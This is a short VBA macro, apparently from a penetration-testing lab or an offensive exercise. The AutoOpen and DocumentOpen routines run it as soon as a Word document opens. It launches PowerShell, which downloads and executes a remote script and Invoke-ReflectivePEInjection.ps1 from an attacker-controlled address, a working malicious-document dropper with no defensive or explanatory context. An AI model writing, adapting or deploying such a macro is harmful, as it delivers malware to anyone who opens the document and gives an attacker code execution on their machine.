Sub mymacro()
    Dim Command As String
    Command = "powershell.exe iex(iwr http://192.168.45.159/amit.txt -UseBasicParsing);iex(iwr http://192.168.45.159/Invoke-ReflectivePEInjection.ps1 -UseBasicParsing)"
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
